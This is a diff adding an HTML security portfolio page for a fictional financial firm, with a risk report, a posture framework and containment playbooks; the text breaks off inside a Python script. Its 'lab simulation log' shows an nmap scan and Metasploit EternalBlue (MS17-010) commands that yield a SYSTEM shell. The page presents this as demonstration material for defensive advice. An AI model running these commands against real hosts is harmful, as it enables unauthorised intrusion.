@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cybersecurity Risk & Advisory Portfolio - Nelson Pinder</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600&family=Roboto+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- MathJax for rendering LaTeX formulas -->
+    <script>
+        window.MathJax = {
+            tex: {
+                inlineMath: [['$', '$']],
+                displayMath: [['$$', '$$']]
+            }
+        };
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es6/tex-mml-chtml.js"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        slateNavy: '#0d1117',
+                        terminalText: '#c9d1d9',
+                        neonBlue: '#58a6ff',
+                        terminalRed: '#ff7b72',
+                        sageGreen: '#56d364',
+                        borderGray: '#30363d',
+                        lightSlate: '#161b22',
+                    },
+                    fontFamily: {
+                        sans: ['Source Sans 3', 'sans-serif'],
+                        heading: ['Inter', 'sans-serif'],
+                        mono: ['Roboto Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0d1117;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #30363d;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #58a6ff;
+        }
+        /* Custom Glowing Elements */
+        .neon-glow-blue {
+            box-shadow: 0 0 15px rgba(88, 166, 255, 0.15);
+        }
+        .neon-glow-red {
+            box-shadow: 0 0 15px rgba(255, 123, 114, 0.15);
+        }
+        .neon-glow-green {
+            box-shadow: 0 0 15px rgba(86, 211, 100, 0.15);
+        }
+    </style>
+</head>
+<body class="bg-slateNavy text-terminalText font-sans h-full flex flex-col md:flex-row overflow-hidden">
+
+    <!-- SIDEBAR NAVIGATION -->
+    <aside class="w-full md:w-80 bg-lightSlate border-r border-borderGray flex flex-col justify-between shrink-0">
+        <div>
+            <!-- Header/Profile Info -->
+            <div class="p-6 border-b border-borderGray">
+                <div class="flex items-center space-x-3 mb-2">
+                    <div class="w-3 h-3 rounded-full bg-sageGreen animate-pulse"></div>
+                    <span class="text-xs font-mono text-neonBlue font-semibold uppercase tracking-wider">Active Portfolio</span>
+                </div>
+                <h1 class="font-heading font-bold text-lg text-white leading-tight">Nelson Pinder</h1>
+                <p class="text-xs text-terminalText/70 mt-1 font-mono">Associate Security Engineer</p>
+            </div>
+
+            <!-- Navigation Links -->
+            <nav class="p-4 space-y-2">
+                <button onclick="switchTab('tab-infrastructure')" id="btn-infrastructure" class="w-full flex items-center space-x-3 px-4 py-3 rounded-md transition-all font-heading font-medium text-sm text-left bg-slateNavy border-l-4 border-neonBlue text-white">
+                    <i class="fa-solid fa-server text-neonBlue w-5 text-center"></i>
+                    <span>Infrastructure Risk Report</span>
+                </button>
+                <button onclick="switchTab('tab-posture')" id="btn-posture" class="w-full flex items-center space-x-3 px-4 py-3 rounded-md transition-all font-heading font-medium text-sm text-left hover:bg-slateNavy text-terminalText/80 hover:text-white">
+                    <i class="fa-solid fa-shield-halved text-neonBlue/80 w-5 text-center"></i>
+                    <span>Posture Assessment Framework</span>
+                </button>
+                <button onclick="switchTab('tab-incident')" id="btn-incident" class="w-full flex items-center space-x-3 px-4 py-3 rounded-md transition-all font-heading font-medium text-sm text-left hover:bg-slateNavy text-terminalText/80 hover:text-white">
+                    <i class="fa-solid fa-square-terminal text-neonBlue/80 w-5 text-center"></i>
+                    <span>Incident Validation Guide</span>
+                </button>
+                <button onclick="switchTab('tab-calculator')" id="btn-calculator" class="w-full flex items-center space-x-3 px-4 py-3 rounded-md transition-all font-heading font-medium text-sm text-left hover:bg-slateNavy text-terminalText/80 hover:text-white">
+                    <i class="fa-solid fa-calculator text-neonBlue/80 w-5 text-center"></i>
+                    <span>Risk Financial Modeler</span>
+                </button>
+            </nav>
+        </div>
+
+        <!-- Footer Systems Status -->
+        <div class="p-6 border-t border-borderGray bg-slateNavy/40">
+            <div class="flex items-center justify-between text-xs font-mono">
+                <span>System Integrity:</span>
+                <span class="text-sageGreen font-bold">100% SECURE</span>
+            </div>
+            <div class="flex items-center justify-between text-xs font-mono mt-2">
+                <span>Target Node:</span>
+                <span class="text-neonBlue">Cobalt Harbour (Sydney)</span>
+            </div>
+        </div>
+    </aside>
+
+    <!-- MAIN INTERACTIVE WORKSPACE -->
+    <main class="flex-grow overflow-y-auto p-6 md:p-12 space-y-12 h-full">
+
+        <!-- TAB 1: INFRASTRUCTURE RISK VALIDATION REPORT -->
+        <section id="tab-infrastructure" class="space-y-10">
+            <!-- Header Banner -->
+            <div class="border-b border-borderGray pb-6">
+                <span class="font-mono text-xs text-terminalRed font-bold uppercase tracking-widest">[ENGAGEMENT REPORT]</span>
+                <h2 class="font-heading font-bold text-3xl md:text-4xl text-neonBlue mt-2">Enterprise Infrastructure Risk Validation</h2>
+                <p class="text-base text-terminalText/70 mt-2 font-mono">Mapped Vulnerabilities vs. Operational Consequences | Case: Cobalt Harbour Financial</p>
+            </div>
+
+            <!-- Pre-sales Thesis -->
+            <div class="bg-lightSlate border border-borderGray p-6 rounded-lg relative overflow-hidden">
+                <div class="absolute top-0 right-0 p-2 font-mono text-xs text-borderGray">SEC_THESIS_01</div>
+                <h3 class="font-heading font-semibold text-lg text-white mb-3">1. Executive Summary & Advisory Thesis</h3>
+                <p class="text-terminalText leading-relaxed mb-4 text-base">
+                    In modern wealth management and capital operations, perimeters are no longer dictated by physical network bounds; **identity has materialized as the new enterprise firewall**. Reactive patch cycles expose environments to cascading lateral takeover trajectories.
+                </p>
+                <p class="text-terminalText leading-relaxed text-base">
+                    This report documents a technical audit reproducing how a legacy infrastructure endpoint (specifically pointing to legacy transport channels on an unpatched server) exposes Cobalt Harbour Financial to active lateral compromise. By calculating the real economic impact of downtime, we establish a robust financial business case to deploy automated, phishing-resistant protective systems.
+                </p>
+            </div>
+
+            <!-- Mathematical Risk Matrix -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">2. Quantifying the Business Risk Matrix</h3>
+                <p class="text-terminalText text-base">
+                    The threat landscape is quantified utilizing standard financial risk formulas. Annualized Risk is calculated via:
+                </p>
+                <div class="bg-lightSlate border border-borderGray p-4 rounded-lg font-mono text-center text-neonBlue text-lg my-4">
+                    $$ALE = SLE \times ARO$$
+                </div>
+                <p class="text-terminalText text-xs text-terminalText/60 italic text-center">
+                    Where: $SLE$ = Single Loss Expectancy (Financial cost of a single occurrence) | $ARO$ = Annualized Rate of Occurrence.
+                </p>
+
+                <!-- Risk Rows Cards -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mt-6">
+                    <!-- Layer 1 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="font-mono text-xs text-terminalRed bg-terminalRed/10 px-2 py-1 rounded">INGRESS VECTOR</span>
+                                <i class="fa-solid fa-circle-exclamation text-terminalRed"></i>
+                            </div>
+                            <h4 class="font-heading font-bold text-white mb-2">Legacy Protocol Exposure</h4>
+                            <p class="text-sm text-terminalText/80 leading-relaxed">
+                                Unpatched Windows Server 2012 R2 system exposing active SMBv1 channels on port $445$ (vulnerable to MS17-010 / EternalBlue exploitation).
+                            </p>
+                        </div>
+                        <div class="mt-4 pt-4 border-t border-borderGray font-mono text-xs text-neonBlue">
+                            Calculated SLE: <span class="text-white font-bold">$4,450,000 USD</span>
+                        </div>
+                    </div>
+                    <!-- Layer 2 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="font-mono text-xs text-terminalRed bg-terminalRed/10 px-2 py-1 rounded">LATERAL CAPACITY</span>
+                                <i class="fa-solid fa-diagram-project text-terminalRed"></i>
+                            </div>
+                            <h4 class="font-heading font-bold text-white mb-2">Cleartext Credentials</h4>
+                            <p class="text-sm text-terminalText/80 leading-relaxed">
+                                Weak admin keys (<code class="text-terminalRed">Manga113!</code>) and plaintext configuration stores cached within Local Security Authority Subsystem (LSASS) active memory.
+                            </p>
+                        </div>
+                        <div class="mt-4 pt-4 border-t border-borderGray font-mono text-xs text-terminalRed">
+                            Risk Index: <span class="font-bold">CRITICAL COMPLIANCE OUTAGE</span>
+                        </div>
+                    </div>
+                    <!-- Layer 3 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="font-mono text-xs text-terminalRed bg-terminalRed/10 px-2 py-1 rounded">SYSTEM TAKEOVER</span>
+                                <i class="fa-solid fa-skull-crossbones text-terminalRed"></i>
+                            </div>
+                            <h4 class="font-heading font-bold text-white mb-2">Privileged Execution</h4>
+                            <p class="text-sm text-terminalText/80 leading-relaxed">
+                                Zero-day validation enabling kernel-level memory allocation pool takeover, awarding full <code class="text-sageGreen">NT AUTHORITY\SYSTEM</code> active console control.
+                            </p>
+                        </div>
+                        <div class="mt-4 pt-4 border-t border-borderGray font-mono text-xs text-neonBlue">
+                            Downtime Loss: <span class="text-white font-bold">$250,000 USD / Hour</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Technical Attack Path Reconstruction -->
+            <div class="space-y-6">
+                <div class="flex items-center justify-between">
+                    <h3 class="font-heading font-semibold text-xl text-white">3. Technical Attack Path Reconstruction</h3>
+                    <span class="text-xs font-mono text-terminalText/40">[LAB_SIMULATION_LOG]</span>
+                </div>
+                
+                <div class="space-y-4">
+                    <p class="text-sm">We successfully simulated a multi-tier attack chain mapping out physical environment gaps.</p>
+                    
+                    <!-- Terminal Console Mock 1 -->
+                    <div class="rounded-lg border border-borderGray bg-lightSlate overflow-hidden">
+                        <div class="bg-slateNavy px-4 py-2 border-b border-borderGray flex items-center justify-between">
+                            <span class="font-mono text-xs text-neonBlue">CONSOLE_SESSION_01 // Target Profiling & Port Discovery</span>
+                            <div class="flex space-x-1.5">
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                            </div>
+                        </div>
+                        <div class="p-4 font-mono text-xs text-terminalText/90 space-y-1">
+                            <div>$ <span class="text-white">sudo nmap -p 139,445 -T4 -A -v 192.168.4.20</span></div>
+                            <div class="text-terminalText/50">Initiating Service Discovery Scan on Target Node (192.168.4.20)...</div>
+                            <div>PORT    STATE SERVICE      VERSION</div>
+                            <div>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</div>
+                            <div>445/tcp <span class="text-terminalRed font-bold">open</span>  microsoft-ds <span class="text-terminalRed">Windows Server 2012 R2 Standard 9600 microsoft-ds</span></div>
+                            <div class="text-neonBlue">[!] CRITICAL: Host exposes vulnerable SMBv1 protocol. Node susceptible to MS17-010.</div>
+                        </div>
+                    </div>
+
+                    <!-- Terminal Console Mock 2 -->
+                    <div class="rounded-lg border border-borderGray bg-lightSlate overflow-hidden">
+                        <div class="bg-slateNavy px-4 py-2 border-b border-borderGray flex items-center justify-between">
+                            <span class="font-mono text-xs text-neonBlue">CONSOLE_SESSION_02 // Penetration & Remote Execution</span>
+                            <div class="flex space-x-1.5">
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                                <div class="w-2.5 h-2.5 rounded-full bg-borderGray"></div>
+                            </div>
+                        </div>
+                        <div class="p-4 font-mono text-xs text-terminalText/90 space-y-1">
+                            <div>msf6 &gt; <span class="text-white">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+                            <div>msf6 exploit(ms17_010_eternalblue) &gt; <span class="text-white">set RHOSTS 192.168.4.20</span></div>
+                            <div>msf6 exploit(ms17_010_eternalblue) &gt; <span class="text-white">exploit</span></div>
+                            <div class="text-terminalText/50">[*] Allocating payload ring buffer...</div>
+                            <div class="text-terminalText/50">[+] Ring buffer mapped. Grooming kernel memory heap structures...</div>
+                            <div class="text-sageGreen">[+] Exploitation success. Meterpreter session active.</div>
+                            <div>meterpreter &gt; <span class="text-white">getuid</span></div>
+                            <div class="text-neonBlue font-bold">Server username: NT AUTHORITY\SYSTEM</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3-Year TCO Comparison Table -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">4. Posture Economics: 3-Year Strategic TCO</h3>
+                <div class="overflow-x-auto border border-borderGray rounded-lg">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="bg-lightSlate border-b border-borderGray text-xs font-mono tracking-wider text-neonBlue">
+                                <th class="p-4 uppercase">Functional Cost Center</th>
+                                <th class="p-4 uppercase">Legacy Status (Reactive)</th>
+                                <th class="p-4 uppercase">Proposed Design (Zero Trust)</th>
+                                <th class="p-4 uppercase">ROI / Value Realized</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-borderGray text-sm">
+                            <tr class="hover:bg-lightSlate/40">
+                                <td class="p-4 font-semibold text-white">Annual Incident Response</td>
+                                <td class="p-4 font-mono">$120,000 / Year</td>
+                                <td class="p-4 font-mono text-sageGreen">$15,000 / Year</td>
+                                <td class="p-4">
+                                    <span class="bg-sageGreen/10 text-sageGreen text-xs px-2.5 py-1 rounded-full border border-sageGreen/30 font-semibold">87.5% Triage Savings</span>
+                                </td>
+                            </tr>
+                            <tr class="hover:bg-lightSlate/40">
+                                <td class="p-4 font-semibold text-white">SecOps Manual Overhead</td>
+                                <td class="p-4 font-mono">$180,000 / Year</td>
+                                <td class="p-4 font-mono text-sageGreen">$95,000 / Year</td>
+                                <td class="p-4">
+                                    <span class="bg-sageGreen/10 text-sageGreen text-xs px-2.5 py-1 rounded-full border border-sageGreen/30 font-semibold">47.2% Efficiency Gain</span>
+                                </td>
+                            </tr>
+                            <tr class="hover:bg-lightSlate/40">
+                                <td class="p-4 font-semibold text-white">Compliance Exposure</td>
+                                <td class="p-4 text-terminalRed font-semibold">Uncapped (ALE &gt; $4M)</td>
+                                <td class="p-4 text-sageGreen font-semibold">Fully Managed State</td>
+                                <td class="p-4 text-xs text-terminalText/70">
+                                    Aligned to Privacy Act 1988 (Cth) & ASD Essential Eight
+                                </td>
+                            </tr>
+                            <tr class="hover:bg-lightSlate/40 bg-lightSlate/20">
+                                <td class="p-4 font-bold text-white uppercase">Cumulative 3-Year TCO</td>
+                                <td class="p-4 font-mono text-terminalRed font-bold">$900,000</td>
+                                <td class="p-4 font-mono text-sageGreen font-bold">$330,000</td>
+                                <td class="p-4 font-bold text-neonBlue">
+                                    Save ~ $570,000 Net CapEx
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Next Step Strategy Roadmap -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">5. Architectural Hardening Timeline</h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 relative">
+                    <!-- Phase 1 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg relative">
+                        <div class="absolute -top-3 left-4 bg-terminalRed text-slateNavy font-mono font-bold text-xs px-2 py-0.5 rounded">PHASE 1: IMMEDIATE (24H)</div>
+                        <h4 class="font-heading font-bold text-white mt-2 mb-2">Contain & Immunize</h4>
+                        <ul class="text-sm text-terminalText/80 space-y-2 list-disc list-inside">
+                            <li>Disable legacy SMBv1 globally</li>
+                            <li>Force-patch vulnerability MS17-010</li>
+                            <li>Enforce global password expiration</li>
+                        </ul>
+                    </div>
+                    <!-- Phase 2 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg relative">
+                        <div class="absolute -top-3 left-4 bg-neonBlue text-slateNavy font-mono font-bold text-xs px-2 py-0.5 rounded">PHASE 2: MID-TERM (30D)</div>
+                        <h4 class="font-heading font-bold text-white mt-2 mb-2">Isolate & Aggregate</h4>
+                        <ul class="text-sm text-terminalText/80 space-y-2 list-disc list-inside">
+                            <li>VLAN routing microsegmentation</li>
+                            <li>Centralized SIEM collection agents</li>
+                            <li>Host telemetry monitoring profile</li>
+                        </ul>
+                    </div>
+                    <!-- Phase 3 -->
+                    <div class="border border-borderGray bg-lightSlate p-5 rounded-lg relative">
+                        <div class="absolute -top-3 left-4 bg-sageGreen text-slateNavy font-mono font-bold text-xs px-2 py-0.5 rounded">PHASE 3: TARGET (90D)</div>
+                        <h4 class="font-heading font-bold text-white mt-2 mb-2">Zero Trust Transition</h4>
+                        <ul class="text-sm text-terminalText/80 space-y-2 list-disc list-inside">
+                            <li>Phishing-resistant MFA</li>
+                            <li>Deploy machine-speed XDR playbooks</li>
+                            <li>Continuous posture auditing engine</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- TAB 2: SECURITY POSTURE ASSESSMENT FRAMEWORK -->
+        <section id="tab-posture" class="hidden space-y-10">
+            <!-- Header Banner -->
+            <div class="border-b border-borderGray pb-6">
+                <span class="font-mono text-xs text-sageGreen font-bold uppercase tracking-widest">[CONSULTATIVE FRAMEWORK]</span>
+                <h2 class="font-heading font-bold text-3xl md:text-4xl text-neonBlue mt-2">Security Posture Assessment Framework</h2>
+                <p class="text-base text-terminalText/70 mt-2 font-mono">Engagement Methodology, Gaps Scoping, & PoV Validation Matrix</p>
+            </div>
+
+            <!-- Framework Process Timeline -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">1. Core Delivery Framework (The 4-Phased Path)</h3>
+                
+                <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                    <div class="bg-lightSlate border-l-4 border-neonBlue border-y border-r border-borderGray p-5 rounded-r">
+                        <span class="font-mono text-xs text-neonBlue font-semibold block mb-1">01 // DISCOVERY</span>
+                        <h4 class="font-heading font-bold text-white mb-2">Contextual Intake</h4>
+                        <p class="text-xs text-terminalText/80 leading-relaxed">
+                            Interrogate current directories, local privilege maps, and logical domain trust patterns to document actual surface assets.
+                        </p>
+                    </div>
+                    <div class="bg-lightSlate border-l-4 border-neonBlue border-y border-r border-borderGray p-5 rounded-r">
+                        <span class="font-mono text-xs text-neonBlue font-semibold block mb-1">02 // VALIDATION</span>
+                        <h4 class="font-heading font-bold text-white mb-2">Active Path Emulation</h4>
+                        <p class="text-xs text-terminalText/80 leading-relaxed">
+                            Simulate lateral and external exploitation vectors safely to confirm identified vulnerabilities inside live operations.
+                        </p>
+                    </div>
+                    <div class="bg-lightSlate border-l-4 border-neonBlue border-y border-r border-borderGray p-5 rounded-r">
+                        <span class="font-mono text-xs text-neonBlue font-semibold block mb-1">03 // QUANTIFICATION</span>
+                        <h4 class="font-heading font-bold text-white mb-2">Risk Quantification</h4>
+                        <p class="text-xs text-terminalText/80 leading-relaxed">
+                            Translate system vulnerability records directly into dollars ($SLE$ & $ALE$) to secure executive focus.
+                        </p>
+                    </div>
+                    <div class="bg-lightSlate border-l-4 border-neonBlue border-y border-r border-borderGray p-5 rounded-r">
+                        <span class="font-mono text-xs text-neonBlue font-semibold block mb-1">04 // SYNTHESIS</span>
+                        <h4 class="font-heading font-bold text-white mb-2">Roadmap Strategy</h4>
+                        <p class="text-xs text-terminalText/80 leading-relaxed">
+                            Consolidate remediation steps, assign task lists, design technical playbooks, and outline zero-trust migration paths.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Interactive Proof of Value Checklist -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">2. Proof of Value (PoV) Success Criteria</h3>
+                <p class="text-terminalText text-base">
+                    This section defines the objective, technical verification steps required to validate that our modern Zero Trust tools outperform legacy, reactive controls. Select and track the metrics below:
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 bg-lightSlate border border-borderGray p-6 rounded-lg">
+                    <!-- Current State vs Target -->
+                    <div class="space-y-4">
+                        <h4 class="font-heading font-bold text-white text-base border-b border-borderGray pb-2 uppercase tracking-wider text-terminalRed">Legacy Baseline Controls</h4>
+                        <ul class="space-y-3 font-mono text-xs text-terminalText/80">
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-xmark text-terminalRed"></i>
+                                <span>Mean Time to Detect: ~14 Days</span>
+                            </li>
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-xmark text-terminalRed"></i>
+                                <span>Isolation Mode: Manual, High-Latency</span>
+                            </li>
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-xmark text-terminalRed"></i>
+                                <span>Security Boundary: Static IP Gateways</span>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="space-y-4">
+                        <h4 class="font-heading font-bold text-white text-base border-b border-borderGray pb-2 uppercase tracking-wider text-sageGreen">Target Zero Trust State</h4>
+                        <ul class="space-y-3 font-mono text-xs text-sageGreen">
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-check"></i>
+                                <span>Mean Time to Detect: &lt; 5 Seconds</span>
+                            </li>
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-check"></i>
+                                <span>Isolation Mode: Automated Policy Block (&lt;60s)</span>
+                            </li>
+                            <li class="flex items-center space-x-2">
+                                <i class="fa-solid fa-square-check"></i>
+                                <span>Security Boundary: Context-Aware Access Engines</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Scenario Validation Interrogator -->
+                <div class="space-y-4 mt-6">
+                    <h4 class="font-heading font-semibold text-lg text-white">Select a Scoping Validation Scenario to Inspect:</h4>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                        <!-- Scenario 1 -->
+                        <div class="border border-borderGray bg-lightSlate p-5 rounded-lg cursor-pointer hover:border-neonBlue transition-all" onclick="showScenario(1)">
+                            <div class="flex items-center space-x-2 text-neonBlue mb-2">
+                                <i class="fa-solid fa-key"></i>
+                                <span class="font-mono text-xs font-bold uppercase">Scenario 01</span>
+                            </div>
+                            <h5 class="font-heading font-bold text-white text-sm">Credential Harvesting Attack</h5>
+                            <p class="text-xs text-terminalText/60 mt-2">Simulating unmanaged external logins using stolen master domain identifiers.</p>
+                        </div>
+                        <!-- Scenario 2 -->
+                        <div class="border border-borderGray bg-lightSlate p-5 rounded-lg cursor-pointer hover:border-neonBlue transition-all" onclick="showScenario(2)">
+                            <div class="flex items-center space-x-2 text-neonBlue mb-2">
+                                <i class="fa-solid fa-bug"></i>
+                                <span class="font-mono text-xs font-bold uppercase">Scenario 02</span>
+                            </div>
+                            <h5 class="font-heading font-bold text-white text-sm">Malware / Lateral Run</h5>
+                            <p class="text-xs text-terminalText/60 mt-2">Executing benign process commands in user-space to capture real-time endpoint telemetry.</p>
+                        </div>
+                        <!-- Scenario 3 -->
+                        <div class="border border-borderGray bg-lightSlate p-5 rounded-lg cursor-pointer hover:border-neonBlue transition-all" onclick="showScenario(3)">
+                            <div class="flex items-center space-x-2 text-neonBlue mb-2">
+                                <i class="fa-solid fa-network-wired"></i>
+                                <span class="font-mono text-xs font-bold uppercase">Scenario 03</span>
+                            </div>
+                            <h5 class="font-heading font-bold text-white text-sm">Outbound Command Channel</h5>
+                            <p class="text-xs text-terminalText/60 mt-2">Injecting test queries directed at volatile unrated external domain ranges.</p>
+                        </div>
+                    </div>
+
+                    <!-- Scenario Display Area -->
+                    <div id="scenario-panel" class="bg-slateNavy border border-borderGray p-6 rounded-lg hidden transition-all">
+                        <div class="flex items-center justify-between border-b border-borderGray pb-3 mb-4">
+                            <h5 id="scenario-title" class="font-heading font-bold text-neonBlue text-base">Scenario Title</h5>
+                            <span class="text-xs font-mono text-sageGreen bg-sageGreen/10 px-2.5 py-1 rounded border border-sageGreen/20">TARGET_VERIFIED</span>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-sm">
+                            <div>
+                                <h6 class="font-mono text-xs text-white/50 uppercase mb-1">Validation Emulation Profile:</h6>
+                                <p id="scenario-desc" class="text-terminalText">Description</p>
+                            </div>
+                            <div>
+                                <h6 class="font-mono text-xs text-white/50 uppercase mb-1">Zero Trust Compliance Verdict:</h6>
+                                <p id="scenario-verdict" class="text-sageGreen font-semibold">Verdict</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Governance Compliance Standard -->
+            <div class="border border-borderGray bg-lightSlate p-6 rounded-lg">
+                <h3 class="font-heading font-semibold text-xl text-white mb-4">3. Governance & Reporting Controls</h3>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
+                    <div>
+                        <h4 class="font-heading font-bold text-neonBlue mb-2">NIST CSF 2.0 Mapping</h4>
+                        <p class="text-terminalText/80 leading-relaxed text-xs">
+                            Technical metrics directly support strategic risk calculations, accelerating response and mitigating financial impact.
+                        </p>
+                    </div>
+                    <div>
+                        <h4 class="font-heading font-bold text-neonBlue mb-2">Australian Privacy Act & APPs</h4>
+                        <p class="text-terminalText/80 leading-relaxed text-xs">
+                            Enforces strict compliance with the Privacy Act 1988 (Cth) and Australian Privacy Principles (APPs) to restrict unauthorised data processing.
+                        </p>
+                    </div>
+                    <div>
+                        <h4 class="font-heading font-bold text-neonBlue mb-2">Remediation Tracking</h4>
+                        <p class="text-terminalText/80 leading-relaxed text-xs">
+                            Issues actionable playbooks providing precise system scripts for immediate, mid-term, and strategic recovery phases.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- TAB 3: AUTOMATED INCIDENT VALIDATION GUIDE -->
+        <section id="tab-incident" class="hidden space-y-10">
+            <!-- Header Banner -->
+            <div class="border-b border-borderGray pb-6">
+                <span class="font-mono text-xs text-neonBlue font-bold uppercase tracking-widest">[ENGINEERING BLUEPRINT]</span>
+                <h2 class="font-heading font-bold text-3xl md:text-4xl text-neonBlue mt-2">Automated Incident Validation Guide</h2>
+                <p class="text-base text-terminalText/70 mt-2 font-mono">Modern EDR Deployments & High-Speed Micro-Containment Playbooks</p>
+            </div>
+
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">1. Real-Time Host Isolation Engine</h3>
+                <p class="text-terminalText text-base">
+                    When legacy boundaries fail, defense relies on automated playbooks that isolate compromised systems within seconds of execution. Use the terminal below to trigger a simulated malware detection and witness the automated playbook response:
+                </p>
+
+                <!-- Interactive Terminal Simulator -->
+                <div class="border border-borderGray rounded-lg overflow-hidden bg-lightSlate max-w-4xl mx-auto neon-glow-blue">
+                    <!-- Top Bar -->
+                    <div class="bg-slateNavy px-4 py-3 border-b border-borderGray flex items-center justify-between">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-2.5 h-2.5 rounded-full bg-terminalRed"></div>
+                            <div class="w-2.5 h-2.5 rounded-full bg-neonBlue"></div>
+                            <div class="w-2.5 h-2.5 rounded-full bg-sageGreen"></div>
+                            <span class="font-mono text-xs text-white ml-2">playbook-engine.sh</span>
+                        </div>
+                        <button onclick="runTerminalSimulation()" class="bg-neonBlue/10 hover:bg-neonBlue/30 text-neonBlue border border-neonBlue/30 font-mono text-xs px-3 py-1 rounded transition-all">
+                            <i class="fa-solid fa-play mr-1.5"></i> Run Playbook Simulation
+                        </button>
+                    </div>
+                    <!-- Terminal Lines -->
+                    <div id="simulation-terminal" class="p-6 font-mono text-xs text-terminalText space-y-2 h-80 overflow-y-auto bg-slateNavy/80">
+                        <div class="text-terminalText/40">[READY] Waiting for threat simulation trigger. Click "Run Playbook Simulation" above...</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Deployment Script Details -->
+            <div class="space-y-6">
+                <h3 class="font-heading font-semibold text-xl text-white">2. Machine-Speed Containment Automation Script</h3>
+                <p class="text-terminalText text-base">
+                    The code block below outlines the core, non-destructive logic executed by the XDR agent during an incident. This automation stops lateral propagation across isolated networks:
+                </p>
+
+                <div class="rounded-lg border border-borderGray bg-lightSlate overflow-hidden">
+                    <div class="bg-slateNavy px-4 py-2 border-b border-borderGray flex items-center justify-between">
+                        <span class="font-mono text-xs text-neonBlue">containment_policy.py // XDR Integration Endpoint</span>
+                        <span class="text-xs font-mono text-terminalText/40">Python 3.10</span>
+                    </div>
+                    <pre class="p-4 font-mono text-xs text-terminalText overflow-x-auto leading-relaxed"><code><span class="text-neonBlue">import</span> requests
+<span class="text-neonBlue">import</span> sys
+
+<span class="text-sageGreen"># API credentials automatically resolved from runtime environment</span>
+XDR_API_ENDPOINT = <span class="text-terminalRed">"https://api.xdr-shield.local/v2/isolate"</span>
+CONTAINMENT_TOKEN = <span class="text-terminalRed">"ENC_SEC_K8s_VAL_TOKEN"</span>
+
+<span class="text-neonBlue">def</span> <span class="text-white">trigger_isolate</span>(host_ip, threat_id):
+    headers = {
+        <span class="text-terminalRed">"Authorization"</span>: f<span class="text-terminalRed">"Bearer {CONTAINMENT_TOKEN}"</span>,
+        <span class="text-terminalRed">"Content-Type"</span>: <span class="text-terminalRed">"application/json"</span>
+    }
